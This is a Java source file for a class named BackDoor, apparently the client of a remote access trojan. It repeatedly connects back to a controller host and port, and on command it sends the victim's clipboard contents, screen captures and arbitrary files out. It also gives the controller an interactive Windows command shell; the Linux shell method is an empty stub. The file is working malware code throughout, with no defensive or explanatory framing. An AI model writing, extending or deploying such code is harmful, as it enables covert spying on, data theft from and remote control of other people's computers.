package client;

import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;
import java.net.SocketException;
import java.util.Scanner;

public class BackDoor {


    private static Socket socket;
    private static DataInputStream dataInputStream;
    private static DataOutputStream dataOutputStream;
    public static String ip = "localhost";
    public static int port = 7777;
    public static final String OS_NAME = System.getProperty("os.name");
    private static final Scanner sc = new Scanner(System.in);


    public static void main(String[] args)  {

        String feedBack = "Nothing to feedback!";

        while (true) {
            if (socket != null && socket.isConnected()) {
                try {
                    String command = dataInputStream.readUTF().trim();
                    if (command.equalsIgnoreCase("cmd")) {
                        try {
                            controlCommandPrompt();
                        } catch (IOException e) {
                            System.err.println(e.toString());
                        }
                    } else if (command != null) {
                        if (command.equalsIgnoreCase("cb")) {
                            String clipBoard = (String) Toolkit.getDefaultToolkit().getSystemClipboard()
                                    .getData(DataFlavor.stringFlavor);
                            if (clipBoard.isEmpty())
                                clipBoard = "Nothing copied to victim's clipboard";
                            dataOutputStream.writeUTF(clipBoard);
                        } else if (command.equalsIgnoreCase("ss")) {
                            System.out.println("# Get command for 'Take Screenshot'");
                            BufferedImage bufferedImage = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                            FTP.sendScreenshot(bufferedImage);
                        } else if (command.equalsIgnoreCase("gf")) {
                            try {
                                System.out.println("# Get command for 'Send a File'");
                                String fileNameWithPath = dataInputStream.readUTF();
                                FTP.sendFile(fileNameWithPath);
                                System.out.println("# File successfully sent");
                            } catch (Exception e) {
                                dataOutputStream.writeUTF("File not found");
                            }
                        }
                    }
                    dataOutputStream.flush();
                } catch (EOFException  | SocketException e) {
                    System.err.println("err: " + e.toString());
                    createConnection();
                } catch (Exception e){
                    System.err.println("err: " + e.toString());
                }
            }else{
                createConnection();
            }
        }
    }

    private static void createConnection()  {
        try {
            Thread.sleep(5000);
            socket = new Socket(ip, port);
            dataInputStream = new DataInputStream(socket.getInputStream());
            dataOutputStream = new DataOutputStream(socket.getOutputStream());
        } catch (Exception ex) {
            System.err.println("err: " + ex.toString());
        }
    }

    private static void controlCommandPrompt() throws IOException{

        String os = OS_NAME.toLowerCase();
        if(os.contains("linux")){
            controlCommandPromptForLinux();
        }else if(os.contains("windows")){
            controlCommandPromptForWindows();
        }
    }

    private static void controlCommandPromptForLinux() throws IOException{


    }

    private static void controlCommandPromptForWindows() throws IOException {

        String dir = System.getProperty("user.dir");
        String dir_specifier = "";
        String cmd = "cmd.exe /c";
        ProcessBuilder builder;
        do {
            if(cmd.startsWith("cd ")){
                dir_specifier = "changed_dir_to_" + System.currentTimeMillis() + "_" + (int) (Math.random()*10000) + ":";
                cmd +=  " && echo " + dir_specifier + "&& cd";
            }
            builder = new ProcessBuilder("cmd.exe", "/c", cmd);
            builder.directory(new File(dir));
            builder.redirectErrorStream(true);
            Process p = builder.start();

            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = "";
            StringBuffer sb = new StringBuffer("");
            while ((line = r.readLine())!=null) {
                if(cmd.startsWith("cd ") && line.equals(dir_specifier)) {
                    line = r.readLine();
                    dir = line;
                }else {
                    sb.append(line + "\n");
                }
            }
            dataOutputStream.writeUTF(sb.toString() + dir+">");
           // System.out.print(dir+">");
            cmd = dataInputStream.readUTF();
            System.out.println("# cmd: " + cmd);
        }while (!cmd.equalsIgnoreCase("exit"));
    }
}
